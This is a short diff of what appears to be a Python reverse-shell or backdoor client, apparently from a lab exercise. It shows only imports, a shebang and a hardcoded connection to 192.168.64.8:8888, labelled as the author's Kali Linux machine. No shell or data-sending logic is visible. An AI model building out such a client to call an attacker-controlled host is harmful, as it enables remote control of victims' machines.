@@ -1,11 +1,15 @@
+#!/bin/python
+
 import socket
 import json
 import time
 import subprocess
 import os
 
+
 SERVER_IP = '192.168.64.8'  # IP of my Kali Linux machine
 SERVER_PORT = 8888
+
 
 
 def send(data):
